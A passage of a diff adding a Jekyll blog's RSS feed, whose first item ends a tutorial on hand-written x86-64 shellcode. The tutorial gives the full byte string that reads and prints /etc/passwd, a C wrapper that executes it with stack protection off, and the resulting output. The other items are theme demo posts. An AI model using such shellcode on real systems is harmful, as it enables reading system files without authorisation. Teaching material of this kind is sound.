+  4000c1:	65 74 63             	gs je  400127 &amp;lt;file+0x67&amp;gt;
+  4000c4:	2f                   	&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bad&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
+  4000c5:	70 61                	jo     400128 &amp;lt;file+0x68&amp;gt;
+  4000c7:	73 73                	jae    40013c &amp;lt;file+0x7c&amp;gt;
+  4000c9:	77 64                	ja     40012f &amp;lt;file+0x6f&amp;gt;
+  4000cb:	41                   	rex.B
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It might be correct. There is no “00” bytes. Now a little trick to extract the opcode from the binary:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; shellcode | tr &lt;span class=&quot;s1&quot;&gt;'\t'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; | tr &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\n'&lt;/span&gt; | egrep &lt;span class=&quot;s1&quot;&gt;'^[0-9a-f]{2}$'&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;eb&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;39&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;5f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;80&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;77&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;41&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;04&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;02&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;f6&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;89&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c7&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;8d&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;24&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;d2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ba&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ff&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ff&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;40&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;b7&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;89&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;b0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;b0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;3c&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;e8&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ff&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ff&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ff&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;74&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;63&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;70&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;73&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;73&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;77&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;64&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;41%
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can now test it!&lt;/p&gt;
+&lt;h1 id=&quot;5-demonstration&quot;&gt;5. Demonstration&lt;/h1&gt;
+&lt;p&gt;A little C wrapper to test the shellcode:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xeb\x39\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x48\x89\xc7\x48\x8d\x34\x24\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\xb7\x01\x48\x89\xc2\x48\x31\xc0\xb0\x01\x0f\x05\x48\x31\xc0\xb0\x3c\x0f\x05\xe8\xc2\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Shellcode length: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)())&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)();&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We now compile it without the none stack exec protection and run it:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc wrapper.c &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; execstack
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./a.out 
+Shellcode length: 76
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Done.&lt;/p&gt;
+
+&lt;p&gt;A good shellcode references website: &lt;a href=&quot;&quot;&gt;http://shell-storm.org/shellcode/&lt;/a&gt;&lt;/p&gt;
+</description>
+				<pubDate>Sun, 28 May 2017 00:00:00 +0100</pubDate>
+				<link>/shellcode/2017/05/28/basic_shellcode.html</link>
+				<guid isPermaLink="true">/shellcode/2017/05/28/basic_shellcode.html</guid>
+			</item>
+		
+			<item>
+				<title>Hello World!</title>
+				<description>&lt;p&gt;&lt;strong&gt;dbyll&lt;/strong&gt; is minimalist, stylish theme for jekyll. Supports gravatar, account links (github, twitter, e-mail, pinterest, résume file) and a bio.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;dbyll&lt;/strong&gt; is brought to you by &lt;strong&gt;&lt;a href=&quot;http://ismaildemirbilek.com&quot;&gt;dbtek&lt;/a&gt;&lt;/strong&gt;. Open sourced under &lt;a href=&quot;http://opensource.org/licenses/MIT&quot;&gt;MIT&lt;/a&gt; license.&lt;/p&gt;
+
+&lt;h3 id=&quot;dbyll-is-on-github&quot;&gt;dbyll is on GitHub&lt;/h3&gt;
+
+&lt;p&gt;&lt;a class=&quot;btn btn-default&quot; href=&quot;https://github.com/dbtek/dbyll&quot;&gt;Grab your copy now!&lt;/a&gt;&lt;/p&gt;
+</description>
+				<pubDate>Fri, 15 Nov 2013 00:00:00 +0000</pubDate>
+				<link>/general/setup/demo/2013/11/15/hello-world.html</link>
+				<guid isPermaLink="true">/general/setup/demo/2013/11/15/hello-world.html</guid>
+			</item>
+		
+			<item>
+				<title>Configuration</title>
+				<description>&lt;p&gt;In your config file change these settings&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;na&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;dbyll&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;author&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;yourname&lt;/span&gt;  
+  &lt;span class=&quot;na&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;youremail&lt;/span&gt;  
+  &lt;span class=&quot;na&quot;&gt;github&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;asd123&lt;/span&gt;  
+  &lt;span class=&quot;na&quot;&gt;twitter&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;asd123&lt;/span&gt;  
+  &lt;span class=&quot;na&quot;&gt;pinterest&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;asd123&lt;/span&gt;  
+  &lt;span class=&quot;na&quot;&gt;linkedin&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;asd123&lt;/span&gt;  
+  &lt;span class=&quot;na&quot;&gt;resume&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;asd123&lt;/span&gt;  
+  &lt;span class=&quot;na&quot;&gt;bio&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Your stylish,  minimalist theme!&lt;/span&gt;  
+  &lt;span class=&quot;na&quot;&gt;email_md5&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;md5ofemail&lt;/span&gt;  &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+</description>
+				<pubDate>Fri, 15 Nov 2013 00:00:00 +0000</pubDate>
+				<link>/general/setup/demo/2013/11/15/configuration.html</link>
+				<guid isPermaLink="true">/general/setup/demo/2013/11/15/configuration.html</guid>
+			</item>
+		
+			<item>
+				<title>Sample</title>
+				<description>&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.&lt;/p&gt;
+
+&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;foo&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'foo'&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+</description>
+				<pubDate>Thu, 14 Nov 2013 00:00:00 +0000</pubDate>
+				<link>/general/demo/2013/11/14/sample.html</link>
+				<guid isPermaLink="true">/general/demo/2013/11/14/sample.html</guid>
+			</item>
+		
+			<item>
+				<title>Sample 2</title>
+				<description>&lt;p&gt;Lorem ipsum dolor sit amet,  consectetur adipisicing elit,  sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,  quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident,  sunt in culpa qui officia deserunt mollit anim id est laborum.&lt;/p&gt;
+
+&lt;p&gt;Lorem ipsum dolor sit amet,  consectetur adipisicing elit,  sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,  quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident,  sunt in culpa qui officia deserunt mollit anim id est laborum.&lt;/p&gt;
+</description>
+				<pubDate>Thu, 14 Nov 2013 00:00:00 +0000</pubDate>
+				<link>/general/demo/sample/2013/11/14/sample-2.html</link>
+				<guid isPermaLink="true">/general/demo/sample/2013/11/14/sample-2.html</guid>
+			</item>
+		
+	</channel>
+</rss>
